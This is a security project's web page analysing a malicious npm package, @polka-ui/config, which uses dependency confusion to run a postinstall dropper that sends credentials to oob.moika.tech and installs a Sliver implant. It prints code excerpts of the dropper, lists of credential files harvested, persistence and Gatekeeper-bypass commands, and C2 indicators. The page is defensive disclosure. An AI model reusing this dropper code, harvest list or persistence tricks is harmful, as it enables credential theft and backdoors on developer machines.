@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>@polka-ui/config: a postinstall that announces itself, then drops Sliver - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="@polka-ui/config: a postinstall that announces itself, then drops Sliver - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>@polka-ui/config: a postinstall that announces itself, then drops Sliver</h1>
+    <span class="post-meta">2026-05-27 &middot; npm &middot; @polka-ui/config</span>
+  </div>
+  <div class="post-body discovery-body">
+    <p><code>@polka-ui/config</code> is published to the public npm registry while its README tells you to point npm at <code>https://npm.polka-ui.io</code>, so a developer at the impersonated org with a misconfigured <code>.npmrc</code> resolves the public tag first and detonates the <code>postinstall</code>. Its header reads <code>[PoC] Dependency confusion payload — AUTHORIZED TESTING ONLY</code>, but the Russian comments and the real Sliver implant at the end make the label an alibi, not a constraint.</p>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<p>The brand-new scope shipped five versions in under fifty minutes under <code>bcs-bank-complex-ui</code>, a handle foreign to <code>@polka-ui</code> that reads as a reused Russian-bank ops alias.</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Maintainer</td>
+<td><code>bcs-bank-complex-ui &lt;bcs-bank-complex-ui@proton.me&gt;</code></td>
+</tr>
+<tr>
+<td>Author (declared)</td>
+<td><code>Polka-Ui Platform Engineering &lt;platform@polka-ui.io&gt;</code></td>
+</tr>
+<tr>
+<td>Versions published</td>
+<td><code>9.9.9</code>, <code>9.9.10</code>, <code>9.9.11</code>, <code>9.9.12</code>, <code>9.9.13</code> on <code>2026-05-27</code> <code>18:28:43Z</code>–<code>19:16:25Z</code>; <code>latest</code> = <code>9.9.13</code></td>
+</tr>
+<tr>
+<td>Repository / homepage / bugs</td>
+<td><code>github.polka-ui.io</code> / <code>docs.polka-ui.io</code> / <code>jira.polka-ui.io</code></td>
+</tr>
+<tr>
+<td>Scripts</td>
+<td><code>postinstall: node scripts/postinstall.js</code></td>
+</tr>
+<tr>
+<td>Provenance</td>
+<td>none (registry signature <code>SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U</code> only)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-1-%E2%80%94-postinstall.js%3A-recon-%2B-dropper" tabindex="-1"><a class="header-anchor" href="#stage-1-%E2%80%94-postinstall.js%3A-recon-%2B-dropper"><span>Stage 1 — <code>postinstall.js</code>: recon + dropper</span></a></h2>
+<p><code>scripts/postinstall.js</code> is the only executable in the tarball. After a three-second sleep — labelled <code>обходит npm audit sandbox таймауты</code> in the source — it sweeps the host and POSTs the result as JSON to <code>oob.moika.tech/report</code>. In parallel a platform-detected stage-2 is written to <code>$TMPDIR/._polka-ui_init.{sh,bat}</code> and reparented through a <code>nohup</code>-detached shell so it outlives the install.</p>
+<pre class="lang-js"><code><span class="tok-kw">const</span> CALLBACK_URL = process.env.DEP_CONFUSION_URL     || <span class="tok-str">'https://oob.moika.tech/report'</span>;
+<span class="tok-kw">const</span> PAYLOAD_BASE = process.env.DEP_CONFUSION_PAYLOAD || <span class="tok-str">'https://oob.moika.tech/payload'</span>;
+<span class="tok-com">// Задержка 30 сек — обходит npm audit sandbox таймауты</span>
+<span class="tok-kw">await</span> <span class="tok-kw">new</span> Promise(r =&gt; setTimeout(r, 3000));
+<span class="tok-kw">const</span> child = require(<span class="tok-str">'child_process'</span>).spawn(<span class="tok-str">'/bin/sh'</span>, [<span class="tok-str">'-c'</span>,
+  <span class="tok-str">`nohup /bin/sh "${tmp}" &gt;/dev/null 2&gt;&amp;1 &amp;`</span>], { detached: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
+child.unref();
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Collected</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>npm_token</code>, <code>npm_config_authtoken</code>, <code>node_auth_token</code>, <code>npm_config__auth</code></td>
+<td><code>process.env</code> lowercase-substring match</td>
+</tr>
+<tr>
+<td><code>aws_access_key_id</code>, <code>aws_secret_access_key</code>, <code>aws_session_token</code></td>
+<td><code>process.env</code></td>
+</tr>
+<tr>
+<td><code>github_token</code>, <code>github_actions</code>, <code>artifactory_token</code>, <code>nexus_token</code>, <code>ci</code></td>
+<td><code>process.env</code></td>
+</tr>
+<tr>
+<td><code>~/.npmrc</code>, <code>/etc/npmrc</code>, <code>./.npmrc</code>, <code>../.npmrc</code> (first 15 lines each)</td>
+<td>filesystem</td>
+</tr>
+<tr>
+<td>parent <code>package.json</code> (name, scripts, deps, repo, author)</td>
+<td><code>../../package.json</code></td>
+</tr>
+<tr>
+<td><code>.git/config</code> + <code>git log --oneline -10</code></td>
+<td><code>../../.git</code></td>
+</tr>
+<tr>
+<td><code>../../.env</code>, <code>/etc/resolv.conf</code>, <code>/etc/hosts</code>, <code>ip a</code> / <code>ifconfig</code></td>
+<td>filesystem + shell</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-2-%E2%80%94-platform-shell-stealer" tabindex="-1"><a class="header-anchor" href="#stage-2-%E2%80%94-platform-shell-stealer"><span>Stage 2 — platform shell stealer</span></a></h2>
+<p>Stage 2 is three platform scripts — 16 KB Linux, 11 KB macOS, 7 KB Windows. Each sweeps credentials into <code>$HOME/dep_confusion_stage2_&lt;os&gt;.txt</code>, then downloads stage-3 and installs persistence. Windows tries seven launch methods until one sticks:</p>
+<ol>
+<li><code>start</code></li>
+<li><code>Start-Process</code></li>
+<li><code>Win32_Process</code></li>
+<li><code>rundll32</code></li>
+<li><code>mshta</code></li>
+<li><code>wscript</code></li>
+<li><code>node -e</code></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Targets harvested</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Linux</td>
+<td><code>/etc/passwd</code>, <code>sudo -l</code>, SUID, <code>id_*</code> + <code>authorized_keys</code> + <code>ssh_config</code>, <code>.env*</code>, <code>*.{json,yaml,toml,ini,conf,properties}</code> greps for <code>api_key/secret/token/password</code>, <code>~/.aws/{credentials,config}</code>, EC2 IMDS, <code>application_default_credentials.json</code>, Azure <code>accessTokens.json</code>, <code>~/.docker/config.json</code>, <code>~/.kube/config</code>, <code>.npmrc</code>, <code>.pypirc</code>, composer <code>auth.json</code>, Maven <code>settings.xml</code>, <code>credentials.tfrc.json</code>, <code>*.tfvars</code>, <code>.vault-token</code>, <code>*.{pem,key,p12,pfx,jks}</code>, <code>.git-credentials</code>, <code>.netrc</code>, <code>.{bash,zsh}_history</code>, <code>/var/run/secrets/kubernetes.io</code></td>
+</tr>
+<tr>
+<td>macOS</td>
+<td>Same target set as Linux, plus <code>xattr -cr</code> + ad-hoc <code>codesign --force --sign -</code> on the stage-3 binary (Gatekeeper bypass)</td>
+</tr>
+<tr>
+<td>Windows</td>
+<td><code>cmdkey /list</code>, <code>%USERPROFILE%\.{ssh,gitconfig,aws,docker,npmrc}</code>, env greps for <code>token/secret/key/aws/github/npm/artifactory/nexus</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-3-%E2%80%94-garble-obfuscated-sliver-implant" tabindex="-1"><a class="header-anchor" href="#stage-3-%E2%80%94-garble-obfuscated-sliver-implant"><span>Stage 3 — garble-obfuscated Sliver implant</span></a></h2>
+<p>Stage 3 is a Go binary built once per platform — 26 MB ELF, 24 MB Mach-O arm64, 36 MB Windows PE — all garble-obfuscated, statically linked, stripped, and hardcoded to the same C2. The Windows build names the family: ten PEs embedded in <code>.rdata</code>, indexed by Sliver's exact resource layout, carry PDBs from rprichard's upstream winpty project that Sliver bundles for a real interactive-shell PTY. One operator runs both ends — UFO Hosting (AS33993, RU) for the implant C2, <a href="http://reg.ru">reg.ru</a>'s <code>moika.tech</code> for stage-1/2 delivery — and the chain is optimized for what's already on a developer laptop or CI runner before the implant ever beacons.</p>
+<h2 id="traits-observed" tabindex="-1"><a class="header-anchor" href="#traits-observed"><span>Traits observed</span></a></h2>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/install-hook/scripts/hook-file</code></td>
+<td><code>package.json</code> declares <code>&quot;postinstall&quot;: &quot;node scripts/postinstall.js&quot;</code> (self-labelled <code>dependency-confusion-npm</code>)</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/recon-exfil/pipeline</code></td>
+<td>JSON POST to <code>https://oob.moika.tech/report</code> carrying env, npmrc, git config, parent <code>.env</code>, <code>ip a</code>, <code>/etc/hosts</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/dropper/execution/stealth-spawn</code></td>
+<td><code>spawn('/bin/sh', ['-c', 'nohup … &amp;'], { detached:true, stdio:'ignore' }).unref()</code> reparents stage-2</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/dropper/delivery/download-execute</code></td>
+<td><code>curl -fsSL</code> / <code>Invoke-WebRequest</code> → <code>chmod +x</code> / PE-magic check → seven-method Windows launch chain</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/credential-access/cloud/{container,token}</code> + <code>credential-access/env/harvesting</code></td>
+<td>system-wide <code>find</code> for <code>id_*</code>, <code>authorized_keys</code>, <code>.env*</code>, <code>*.{pem,key,p12}</code>, <code>~/.aws/credentials</code>, GCP ADC, Azure tokens, K8s secrets, <code>.vault-token</code>, EC2 IMDS</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/remote-command/control</code></td>
+<td>Classifier matches <code>go-garbled-ssh-c2-backdoor</code> + <code>go-ssh-exec-c2-backdoor</code> on stage-3 symbol shape alone — independent confirmation of the winpty / Sliver fingerprint</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/anti-static/obfuscation/tools/garble</code></td>
+<td>Stage-3 ELF / Mach-O / PE all carry garble-randomized symbols and stripped Go module tables</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/infrastructure/config</code> + <code>domain/tld</code></td>
+<td><code>https://141.98.189.248:32322</code> hardcoded in all three binaries (UFO Hosting LLC, RU, AS33993)</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>well-known/tool/sysadmin/console</code> (× 10, embedded)</td>
+<td>Sliver's <code>executables/&lt;arch&gt;/{regular,xp}/winpty(.dll|-agent.exe)</code> resource layout with <code>C:\rprichard\proj\winpty</code> PDBs</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>micro-behaviors/crypto/symmetric/stream::go-obfuscated-xor-stream</code></td>
+<td>Multiple garbled packages call <code>XORKeyStream</code> (e.g. <code>jAmp6hOkg3u.(*FeD1DdXQ).XORKeyStream</code>, <code>Q4QTvhbIIRr.(*o8nCXVrS3F).XORKeyStream</code>) — stream-cipher layer alongside the TLS C2</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/persistence/{system/init/boot, login/registry/autostart, system/cron/schedule}</code></td>
+<td><code>systemd --user</code> <code>dbus-broker.service</code>, <code>HKCU\…\Run</code> <code>MicrosoftUpdateService</code>, <code>schtasks</code> <code>MicrosoftEdgeUpdateCore</code>, crontab <code>@reboot</code>, Startup folder copy</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/evasion/{anti-av/platform/gatekeeper, quarantine-removal/bypass, security-bypass/codesign}</code></td>
+<td>macOS stage-2 runs <code>xattr -cr</code> + <code>codesign --force --sign -</code> on the stage-3 Mach-O</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/evasion/hosts-file/block-security</code> + <code>command-and-control/infrastructure/dns-pin</code></td>
+<td>Reads <code>/etc/hosts</code> / <code>C:\Windows\System32\drivers\etc\hosts</code> during recon</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/evasion/masquerade/debug::pe-stem-differs-from-pdb-stem</code></td>
+<td>Each embedded winpty PE's filename stem disagrees with its embedded PDB stem — the bundle was renamed after build, not produced from the PDB-named source</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/package/npm</code></td>
+<td>Scoped name <code>@polka-ui/config</code> published publicly; <code>license: UNLICENSED</code>; <code>repository.url</code> + <code>bugs.url</code> + <code>homepage</code> all point at non-existent <code>polka-ui.io</code> infra; <code>dist/index.js</code> re-exports a <code>src/index.js</code> not in the tarball</td>
+</tr>
+</tbody>
+</table>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Package</td>
+<td><code>@polka-ui/config@9.9.11</code> (npm, scoped, public-registry)</td>
+</tr>
+<tr>
+<td>Tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/cefab95fdea9a19f1c7f76f589d663b428ea3f4f674210ad6dadc43277c67ed9"><code>cefab95fdea9a19f1c7f76f589d663b428ea3f4f674210ad6dadc43277c67ed9</code></a> (5,255 B)</td>
+</tr>
+<tr>
+<td>Tarball SHA-1 (npm <code>shasum</code>)</td>
+<td><code>6c164d221d9204d3029bd10c0c9f41e30bba10ac</code></td>
+</tr>
+<tr>
+<td><code>scripts/postinstall.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/f7c6bc732dc276b8b11cda85378e416881f65561f550b903e2ad0ba234b3a9d7"><code>f7c6bc732dc276b8b11cda85378e416881f65561f550b903e2ad0ba234b3a9d7</code></a> (274 lines)</td>
+</tr>
+<tr>
+<td>Stage-1 callback</td>
+<td><code>POST https://oob.moika.tech/report</code> (env, npmrc, git, parent <code>.env</code>, network)</td>
+</tr>
+<tr>
+<td>Stage-2 URLs</td>
+<td><code>https://oob.moika.tech/payload/{linux,mac,win}</code> → <code>72.56.97.200</code> (<a href="http://reg.ru">reg.ru</a>, <code>moika.tech</code>)</td>
+</tr>
+<tr>
+<td>Stage-2 SHA-256 (linux)</td>
+<td><a href="https://lab.atomdrift.org/file/d0948dbf94409660ab97eb937a41eb23137dd2414530dcba2b717a4993d797b1"><code>d0948dbf94409660ab97eb937a41eb23137dd2414530dcba2b717a4993d797b1</code></a> (16,739 B)</td>
+</tr>
+<tr>
+<td>Stage-2 SHA-256 (macOS)</td>
+<td><a href="https://lab.atomdrift.org/file/6e45f9b81797b39a7a91ba51e0a0ac70a347dc5e4ab13d696bb3b510062525ad"><code>6e45f9b81797b39a7a91ba51e0a0ac70a347dc5e4ab13d696bb3b510062525ad</code></a> (11,270 B)</td>
+</tr>
+<tr>
+<td>Stage-2 SHA-256 (Windows)</td>
+<td><a href="https://lab.atomdrift.org/file/74e89da49fd481e01a88de51da7eb1d4d31755cec5e9067d2b0f1505b5e6e478"><code>74e89da49fd481e01a88de51da7eb1d4d31755cec5e9067d2b0f1505b5e6e478</code></a> (6,629 B)</td>
+</tr>
+<tr>
+<td>Stage-3 URLs</td>
+<td><code>https://oob.moika.tech/bins/{linux/linux,mac/macos,win/win}</code></td>
+</tr>
+<tr>
+<td>Stage-3 SHA-256 (ELF x86-64)</td>
+<td><a href="https://lab.atomdrift.org/file/80b98bd4b63d5a9cb8623c3e03a4596692a9304f9e82253241c457fccb697989"><code>80b98bd4b63d5a9cb8623c3e03a4596692a9304f9e82253241c457fccb697989</code></a> (26,194,068 B, statically linked, stripped, Go)</td>
+</tr>
+<tr>
+<td>Stage-3 SHA-256 (Mach-O arm64)</td>
+<td><a href="https://lab.atomdrift.org/file/1fd0c8a7ce279a40e2921177b1fb80d0f5a3d1afe47192cf4e62bb048f388498"><code>1fd0c8a7ce279a40e2921177b1fb80d0f5a3d1afe47192cf4e62bb048f388498</code></a> (23,694,482 B, ad-hoc signed)</td>
+</tr>
+<tr>
+<td>Stage-3 SHA-256 (PE x86-64)</td>
+<td><a href="https://lab.atomdrift.org/file/c4ca166af92dd73595fdd908511916d0c53c65047886db3fe688c2b5d622588f"><code>c4ca166af92dd73595fdd908511916d0c53c65047886db3fe688c2b5d622588f</code></a> (35,801,088 B, 9 embedded winpty PEs)</td>
+</tr>
+<tr>
+<td>Implant C2</td>
+<td><code>https://141.98.189.248:32322</code> → UFO Hosting LLC, AS33993, RU (inetnum allocated 2025-12-03)</td>
+</tr>
+<tr>
+<td>Persistence (Linux)</td>
+<td><code>~/.config/systemd/user/dbus-broker.service</code> → <code>$HOME/.cache/._kworker</code>; crontab <code>@reboot</code>; <code>~/.bashrc</code></td>
+</tr>
+<tr>
+<td>Persistence (macOS)</td>
+<td><code>$HOME/Library/Application Support/.coreservices/universald</code> (<code>xattr -cr</code> + ad-hoc codesign)</td>
+</tr>
+<tr>
+<td>Persistence (Windows)</td>
+<td><code>HKCU\…\Run\MicrosoftUpdateService</code> → <code>%APPDATA%\Microsoft\Windows\WinUpdate.exe</code>; <code>schtasks /tn MicrosoftEdgeUpdateCore /sc onlogon</code>; Startup-folder copy</td>
+</tr>
+<tr>
+<td>Family</td>
+<td>Sliver (BishopFox), garble-obfuscated, winpty-bundled</td>
+</tr>
+<tr>
+<td>Family fingerprints</td>
+<td><code>executables/{386,amd64,arm64}/{regular,xp}/winpty(.dll|-agent.exe)</code> resource paths; <code>C:\rprichard\proj\winpty\src\…</code> + <code>C:\Users\mail\source\winpty\src\…</code> PDBs; permissive Go SSH server (<code>NoClientAuth</code>+<code>PublicKeyCallback</code>); X25519/ChaCha8/ARC4 mix</td>
+</tr>
+<tr>
+<td>Operator language</td>
+<td>Russian inline comments (<code>Задержка 30 сек — обходит npm audit sandbox таймауты</code>, <code>Скачать</code>, <code>Скрыть консоль</code>)</td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
